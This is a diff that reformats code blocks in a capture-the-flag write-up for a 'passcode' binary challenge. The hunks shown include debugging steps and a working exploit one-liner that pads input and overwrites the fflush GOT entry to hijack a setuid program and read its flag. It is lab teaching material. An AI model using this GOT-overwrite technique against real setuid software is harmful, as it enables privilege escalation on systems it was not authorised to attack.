@@ -16,7 +16,7 @@ After ssh, we see the following:
 ls -lh
 ```
 
-```
+```sh
 -r--r----- 1 root passcode_pwn   48 Jun 26  2014 flag
 -r-xr-sr-x 1 root passcode_pwn 7.4K Jun 26  2014 passcode
 -rw-r--r-- 1 root root          858 Jun 26  2014 passcode.c
@@ -26,7 +26,9 @@ We can see that executes with suid bit of passcode_pwn, which would allow it to 
 
 Let's try to compile the source code to see what warning they're talking about.
 
-`gcc passcode.c`
+```sh
+gcc passcode.c
+```
 
 ```
 passcode.c: In function ‘login’:
@@ -40,7 +42,9 @@ passcode.c:14:9: warning: format ‘%d’ expects argument of type ‘int *’, 
 
 If we try to run the program, we get the following:
 
-`./passcode`
+```sh
+./passcode
+```
 
 ```
 Toddler's Secure Login System 1.0 beta.
@@ -114,7 +118,9 @@ The disassembly gives us more insight on which memory addresses are being used d
 
 Let's see what the stack looks like if we fill name[100].
 
-`pwndbg ./passcode`
+```sh
+pwndbg ./passcode
+```
 
 ```
 pwndbg> b *0x80485c5
@@ -169,7 +175,7 @@ We pad our buffer with 96 bytes, then the address of fflush, `0x0804a004`, then 
 
 ### Capturing the Flag
 
-```
+```sh
 passcode@ubuntu:~$ python -c "print('a'*96+'\x04\xa0\x04\x08\n134514147\n10\n')" > /tmp/passcode.input
 passcode@ubuntu:~$ ./passcode < /tmp/passcode.input
 Toddler's Secure Login System 1.0 beta.
